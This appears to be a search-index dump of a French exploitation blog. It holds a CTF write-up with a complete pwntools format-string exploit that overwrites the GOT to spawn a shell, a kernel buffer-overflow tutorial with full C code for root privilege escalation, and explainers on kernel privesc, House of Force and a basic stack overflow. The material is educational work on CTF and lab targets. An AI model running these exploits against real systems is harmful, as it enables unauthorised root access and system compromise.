[{"categories":["format string","HSR","pwn"],"content":" Binary AnalysisPour analyser le binaire, on va commencer par l’ouvrir avec un décompilo, comme Binja. Le binaire n’étant pas strippé, on peut s’aider des symboles pour deviner ce que fait chaque fonction. A part la fonction backdoor() qui aspire à servir de fonction win(), le nom des fonctions ne nous apporte rien d’intéressant. Regardons un peu plus en détail ce que fait le programme. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:0","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" Main()Tout d’abord, la fonction main() va lire l’entrée standard à 2 reprises, attendant de l’utilisateur qu’il envoie une chaine de maximum 0x64 caractères. Ensuite elle va stocker ces entrées dans 2 buffers, puis appeler la fonction beaufortCipher() avec ces 2 buffers en paramètres. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:1","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" beaufortCipher()Quant à la fonction cipherBeaufort(), comme son nom l’indique, elle applique un chiffrement de Beaufort sur notre première input. La clé utilisée pour chiffrer le buffer est enfait notre 2ème input. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:2","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" End of main()Une fois que notre input a été chiffrée avec la clé qu’on donne au programme, la fonction main() affiche le buffer chiffré, puis la clé qu’on lui a donné. Et c’est ici que se trouve la vuln. En effet, le printf() que le programme appel pour afficher notre clé prend directement la clé comme premier argument. Ainsi notre input (la clé) est interpetée, par printf(), comme étant le formatteur. Le programme est donc vulnérable à une format string. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:3","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" TheorycraftMaintenant réfléchissons à comment on va exploiter la vuln. Si on fait un checksec, on remarque que le binaire n’a ni PIE, ni RelRO. Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial Dans tous les cas on part du principe que l’ASLR est actif. De plus, comme le chall est en remote, on a pas les détails de l’environnement dans lequel run le binaire, donc c’est trop foireux de se baser sur des adresses hardcodées de la stack. Par contre, l’abscence de RelRO et de PIE nous permet non seulement de localiser la GOT à coup sûr, mais aussi d’y accéder en écriture. On peut donc envisager d’overwrite certaines entrées de la GOT afin d’obtenir notre shell. Enfin on a une fonction backdoor() qui lance un system(\"/bin/ls\"). La string \"/bin/ls\" étant dans la section .data, on peut la changer pour \"/bin/sh\" avant de rediriger le flow d’execution vers backdoor(). ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:2:0","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" ExploitationNotre exploit va se faire en 3 étapes: Trouver à quel offset notre input se trouve sur la stack, au moment du call à printf() Overwrite \"/bin/ls\" avec \"/bin/sh\" Overwrite l’entrée de exit() dans la GOT avec l’adresse de backup() ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:3:0","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" Input offsetPour trouver l’offset, tout ce qu’on a à faire est de lancer le programme, break au moment du printf() vulnérable et regarder à quelle distance de $ESP se trouve notre input. Pour repérer facilement notre input, on va envoyer “aaaaaaa…” comme clé. On voit que notre input est à $0$x$78$ bytes de $ESP, soit en 32 bits, $30*4$ bytes. Notre offset est donc 30. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:3:1","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" The ExploitPour ce qui est de l’exploit, on va utiliser le module fmtstr de Pwntools et plus particulièrement la fonction fmtstr_payload(). Il nous suffit simplement de lui passer comme argument l’offset de notre input ainsi qu’un dictionnaire des adresses et des valeurs qu’on souhaite écrire. payload = fmtstr_payload(30, writes) print(payload) L’adresse de \"/bin/ls\" est 0x0804c024. On va donc écrire “sh” à 0x0804c029, ce qui nous donnera \"/bin/sh\". Enfin on va réécrire l’entrée de exit() dans la GOT par l’adresse de la fonction backup(). writes = { 0x0804c029: 0x00006873, elfexe.got['exit']: elfexe.sym['backdoor']} Ce qui donne comme exploit final : #!/usr/bin/python3.9 from pwn import * context.binary = elfexe = ELF('./beaufort.bin') def start(argv=[], *a, **kw): '''Start the exploit against the target.''' elf_path = elfexe.path if args.REMOTE: remote_server = '10.22.148.11' remote_port = 1341 target = remote(remote_server, remote_port) else: target = process([elf_path] + argv, *a, **kw) return target #=========================================================== # EXPLOIT GOES HERE #=========================================================== def pad(payload): return payload+b'_'*(0x64-len(payload)) arguments = [] io = start(arguments) writes = {0x0804c029: 0x00006873, elfexe.got['exit']: elfexe.sym['backdoor']} payload = b\"A\"*0x60 io.sendline(payload) payload = fmtstr_payload(30, writes) payload = pad(payload) print(payload) io.sendline(payload) io.interactive() io.close() ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:3:2","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["attacks","kernel"],"content":"Technique pour exploiter un buffer overflow basique côté kernel.","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" OverviewTout comme pour une exploitation de BoF en user-land, notre objectif va être d’overwrite la return address de la fonction vulnérable pour prendre le contrôle du flow d’exécution. On se place ici dans le cas où aucune protection n’est présente au niveau du kernel. ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:1:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" DetailNotre objectif lors de l’exploitation d’un buffer overflow en kernel-land est de réussir a exécuter du code user-land tout en profitant de l’exécution de code kernel-land pour élever nos privilèges. Ainsi, un schéma d’attaque classique nous donnerait : Exploiter le buffer overflow. Overwrite l’adresse de retour de la fonction vulnérable par l’adresse de la fonction privesc(). privesc() passe les privilèges du process, lancé par notre binaire exploit, a root. Maintenant qu’on a des privilèges root, on peut lancer un system(\"/bin/sh\"). ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:2:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" ExploitPour implémenter cette attaque, on va se mettre dans le cas où on peut interagir avec une device, dont la propriété write fait appel à une fonction vulnérable à un buffer overflow. Ainsi, lorsque l’on va write() plus de caractères qu’attendu, on va overflow sur la stack kernel. Pour exploiter cela, on va tout d’abord devoir ouvrir la device pour interagir avec elle. int global_fd; void open_dev(){ global_fd = open(\"/dev/vulnDevice\", O_RDWR); if (global_fd \u003c 0){ puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } Ensuite on va préparer notre fonction privesc() que l’on va appeler une fois avoir pris le contrôle sur le flow d’exécution côté kernel. Pour mieux comprendre le principe de l’élévation de privilèges côté kernel, allez voir : Kernel Privesc. unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void privesc(){ commit_creds = 0xc107...; prepare_kernel_cred = 0xc107...; commit_creds(prepare_kernel_cred(0)); } Maintenant qu’on a la fonction qui va nous permettre d’élever nos privilèges, on va pouvoir overflow sur la stack kernel et rediriger le flow d’exécution vers cette fonction. void overflow(){ // Overlow at 64 bytes unsigned long long payload[17] = {0}; payload[16] = (unsigned long)privesc; write(global_fd, payload, sizeof(payload)); } Grâce à cet exploit, nous avons manipulé le kernel pour qu’il passe le process spawn par exploit en tant que process root. Il ne nous reste plus qu’à run un system(\"/bin/sh\") pour obtenir un shell root. En résumé, notre exploit final donne quelque chose comme : #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cfcntl.h\u003e int global_fd; unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void open_dev(){ global_fd = open(\"/dev/vulnDevice\", O_RDWR); if (global_fd \u003c 0){ puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } void privesc(){ commit_creds = 0xc107...; prepare_kernel_cred = 0xc107...; commit_creds(prepare_kernel_cred(0)); } void overflow(){ unsigned long long payload[17] = {0}; payload[16] = (unsigned long)privesc; write(global_fd, payload, sizeof(payload)); } int main() { open_dev(); overflow(); system(\"/bin/sh\"); return 0; } ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:3:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":"Introduction au pwn kernel, concept d'élévation des privilèges d'un process.","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/","tags":["pwn","kernel"],"title":"🪜 Kernel Privesc 🪜","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" OverviewL’objectif de ce post est d’aborder la couche d’abstraction nécéssaire à la compréhension du pwn kernel. Pour cela, il est nécéssaire de comprendre comment les différents process interagissent avec le kernel, et comment un contrôle de flow d’execution en kernel-mode peut nous permettre d’améliorer nos privilèges en user-land. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:1:0","tags":["pwn","kernel"],"title":"🪜 Kernel Privesc 🪜","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" Process x KernelIl est important de noter que l’on interagit avec le kernel de pleins de manières différentes. Que ce soit en modifiant le filesystem, avec des syscalls, en communiquant avec des devices… Toutes ces actions nécéssitent une intervention du kernel au niveau des process qui les initient. Pour comprendre et manipuler les process, le kernel linux utilise une structure task_struct contenant toutes le informations dont il a besoin : PID, état du process, niveau de permissions… Il sauvegarde la task_struct de tous les process en mémoire, sous forme de liste chainée. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:2:0","tags":["pwn","kernel"],"title":"🪜 Kernel Privesc 🪜","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" PrivescPuisque le kernel peut modifier la structure d’un process, alors il peut modifier les permissions de ce process, et notamment les passer a root. Ainsi, si on trouve une faille niveau kernel qui nous permet de prendre le contrôle du flow d’execution, alors nous pouvons simplement lancer un process en user-land, augmenter ses privileges côté kernel et retourner en user-land. Pour faire cela, on va donc modifier la task_struct du process qu’on a lancé et changer ses privilèges. Comme les privilèges d’une task_struct sont, eux aussi, définis sous forme de structure, on va faire appel à des fonctions kernel pour modifier proprement la task_struct. /* Process credentials: */ /* Tracer's credentials at attach: */ const struct cred __rcu *ptracer_cred; /* Objective and real subjective task credentials (COW): */ const struct cred __rcu *real_cred; /* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu *cred; Les fonctions commit_creds() et prepare_kernel_cred() vont nous permettre de faire cela. Pour les appeler correctement, a partir de leur adresse, il faut d’abord les définir. unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void escalate_privs(void){ commit_creds = 0x...; prepare_kernel_cred = 0x...; commit_creds(prepare_kernel_cred(0)); } NB: Il y a plusieurs moyens de trouver les adresses de fonctions kernel. Le plus simple est de lire le fichier /proc/kallsyms qui map les adresses et le symboles kernels. II ne reste donc plus qu’à appeler la fonction escalate_privs(). Ce qui n’est possible que si le kernel a des droits d’execution en user-land (pas de SMEP). Sinon il faudra trouver un moyen détourné de faire l’appel aux fonctions. Et maintenant le process détient des privilèges root sur la machine. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:3:0","tags":["pwn","kernel"],"title":"🪜 Kernel Privesc 🪜","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" TLDRPour simplifier, le but est d’exploiter une vulnerabilité pour prendre le contrôle du flow d’execution côté kernel. Ensuite, on va utiliser les fonctions kernel commit_creds() et prepare_kernel_cred() pour modifier les privilèges de notre process. Enfin, on va retourner en user-land pour continuer l’execution de notre process avec les privilèges ameliorés. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:4:0","tags":["pwn","kernel"],"title":"🪜 Kernel Privesc 🪜","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["heap","attacks"],"content":"fa-solid fa-trash-can fa-fw fa-sm","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/","tags":["pwn","heap"],"title":"🔥 House of Force 🔥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" OverviewL’objectif de cette attaque est d’overwrite les metadata du top chunk pour augmenter sa size. Ainsi on va pouvoir faire des malloc sur un espace mémoire beaucoup plus grand et donc malloc en dehors de la HEAP. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:1:0","tags":["pwn","heap"],"title":"🔥 House of Force 🔥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" DetailDans les versions de la GLIBC \u003c 2.29, il n’y a pas de check sur l’intégrité des metadata du top chunk. Ainsi, si la size du top chunk est overwrite, l’algorithme malloc fonctionnera quand même. Comme les chunks sont alloués à partir du top chunk, si on overwrite la size du top chunk, on devrait être en mesure de couvrir l’ensemble des adresses de la mémoire, y compris les addresses en dehors de la heap. L’intérêt de cette attaque est de pouvoir overwrite des valeurs à des adresses plus basses que l’adresse de la HEAP. Voir de simplement overwrite des valeurs en dehors de la HEAP. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:2:0","tags":["pwn","heap"],"title":"🔥 House of Force 🔥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" ExploitL’attaque en elle même se déroule en 3 étapes : Overflow notre buffer et overwrite la size du top chunk. On va le set à une valeur suffisamment grande pour que l’adresse ciblée soit comprise dans la range d’adresses couvertes par le top chunk. On fait un malloc pour placer le début du top chunk juste avant l’adresse ciblée. On effectue un nouveau malloc() qui va nous permettre d’atteindre l’adresse ciblée. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:3:0","tags":["pwn","heap"],"title":"🔥 House of Force 🔥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" Further usePour aller plus loin, on peut tenter d’utiliser cette attaque pour obtenir un shell. Pour cela, un stratégie peut être d’overwrite l’adresse du Malloc hook. Ce dernier étant utilisé à chaque appel de la fonction malloc(), on peut le remplacer par l’adresse de la fonction system() et lui passer une adresse pointant vers un \"/bin/sh\". Ainsi, chaque nouvel appel à la fonction malloc() va hook vers un appel à system(). ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:4:0","tags":["pwn","heap"],"title":"🔥 House of Force 🔥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" LimitationsA partir de la GLIBC 2.29, la size du top chunk est vérifiée pour s’assurer que le top chunk ne sorte pas de sa zone mémoire. GLIBC Top Chunk Size check ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:5:0","tags":["pwn","heap"],"title":"🔥 House of Force 🔥","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":null,"content":" The BugLe Buffer Overflow est un bug qui se produit lorsqu’un programme ecrit dans un buffer plus de bytes que le buffer ne peut en accueillir. Ce que l’on designe par le terme de buffer est une zone memoire dont le programme controle le contenu. Cela peut representer n’importe quel element present en memoire (variables, constantes, zone memoire dynamique…). Le probleme avec ce bug etant que le programme tout entier s’appuie sur la memoire pour fonctionner. Ainsi en debordant du buffer le programme va potentiellement reecrire d’autres elements presents en memoire et donc des element necessaire a son propre fonctionnement, ce qui va souvent provoquer un crash. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:1:0","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" Demonstration du BugPour que ce soit plus parlant voici un exemple tres basique que l’on va etudier en assembleur pour mieux comprendre le reel fonctionnement du programme et comment il interragit avec la memoire. #include \u003cstdio.h\u003e int main(){ int check = 0; char buffer[16]; gets(buffer); if (check == 0x1337) printf(\"Well Done!!\"); return 0; } ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:0","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" AnalysisLe programme est tres simple. Il defini une variable check qu’il initialise a 0. Il defini ensuite un tableau de caracteres, que l’on peu definir comme un buffer puisque un tableau de 16 carateres reprensente concretement une zone memoire de 16 bytes reservee a cette variable. Ensuite, il lit depuis l’entree standard et save l’input lu dans le buffer. Enfin, il verifie que la variable check est bien egale a 0x1337. Ca peut paraitre un peu bizarre. Pourquoi la variable check serait egale a 0x1337 si elle a ete initialisee a 0 et inchangee. Et bien peut etre que le programme est vulnerable et que l’on peut reecrire la valeur de check 😈. Si on s’en referre a la man page de gets(), on se rend compte que la fonction gets() lit la premiere ligne de l’entree standard (stdin) et la sauvegarde dans le buffer passe en parametre. DESCRIPTION gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\\0'). No check for buffer overrun is performed (see BUGS below). Wait, wait, wait… Si gets() lit la premiere ligne de stdin, et que notre buffer ne peut accueilir que 16 bytes, que se passe-t-il si la ligne lu fait plus de 16 bytes? ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:1","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" AssemblyPour le comprendre, regardons ce que fait le programme en bas niveau : push rbp mov rbp,rsp sub rsp,0x20 mov DWORD PTR [rbp-0x4],0x0 lea rax,[rbp-0x20] mov rdi,rax mov eax,0x0 call 0x1040 \u003cgets@plt\u003e cmp DWORD PTR [rbp-0x4],0x1337 jne 0x1186 \u003cmain+61\u003e lea rax,[rip+0xe8b] # 0x2004 mov rdi,rax mov eax,0x0 call 0x1030 \u003cprintf@plt\u003e mov eax,0x0 leave ret Concretement, il y a 2 parties interressantes a regarder : D’abord, le programme va sauvegarder la valeur de check sur la stack. mov DWORD PTR [rbp-0x4],0x0 Ensuite il reserve une zone memoire de minimum 16 bytes (sur la stack) et passe son adresse en argunent a gets(). lea rax,[rbp-0x20] mov rdi,rax mov eax,0x0 call 0x1040 \u003cgets@plt\u003e Ainsi, si on deroule l’execution du programme notre stack va ressembler a quelque chose comme ca: [SCHEMA] ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:2","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" ExploitSi on s’interesse a ce que fait reelement la fonction gets(), elle prend tout simplement un adresse memoire (ici l’adresse de notre buffer), et y ecrit les bytes lus depuis l’entree standard. Le probleme est qu’a l’adresse de buffer+0x1c, il y a la valeur de check. Donc si gets lit plus de 28 bytes, il va ecrire par dessus la valeur de check. [SCHEMA] Si on lance un debugger, qu’on test notre exploit et qu’on break sur l’instruction qui verifie la valeur de check, on peut voir qu’on a bien reecrit la valeur de check sauvegardee en memoire. (gdb) disas main Dump of assembler code for function main: 0x0000000000001149 \u003c+0\u003e: push rbp 0x000000000000114a \u003c+1\u003e: mov rbp,rsp 0x000000000000114d \u003c+4\u003e: sub rsp,0x20 0x0000000000001151 \u003c+8\u003e: mov DWORD PTR [rbp-0x4],0x0 0x0000000000001158 \u003c+15\u003e: lea rax,[rbp-0x20] 0x000000000000115c \u003c+19\u003e: mov rdi,rax 0x000000000000115f \u003c+22\u003e: mov eax,0x0 0x0000000000001164 \u003c+27\u003e: call 0x1040 \u003cgets@plt\u003e 0x0000000000001169 \u003c+32\u003e: cmp DWORD PTR [rbp-0x4],0x1337 0x0000000000001170 \u003c+39\u003e: jne 0x1186 \u003cmain+61\u003e 0x0000000000001172 \u003c+41\u003e: lea rax,[rip+0xe8b] # 0x2004 0x0000000000001179 \u003c+48\u003e: mov rdi,rax 0x000000000000117c \u003c+51\u003e: mov eax,0x0 0x0000000000001181 \u003c+56\u003e: call 0x1030 \u003cprintf@plt\u003e 0x0000000000001186 \u003c+61\u003e: mov eax,0x0 0x000000000000118b \u003c+66\u003e: leave 0x000000000000118c \u003c+67\u003e: ret (gdb) b *main+32 Breakpoint 1 at 0x1169 (gdb) r Starting program: /root/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB On inspecte le contexte dans lequel on a break dans gdb. (gdb) x/i $rip =\u003e 0x555555555169 \u003cmain+32\u003e: cmp DWORD PTR [rbp-0x4],0x1337 (gdb) x/wx $rbp-0x4 0x7fffffffe2dc: 0x42424242 On a donc bien reussi a overwrite la valeur de check 🙂. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:3","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" Scripting the ExploitPour finaliser la technique d’exploitation, on va faire un petit script python qui va gerer toutes les interactions a notre place. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:4","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"}]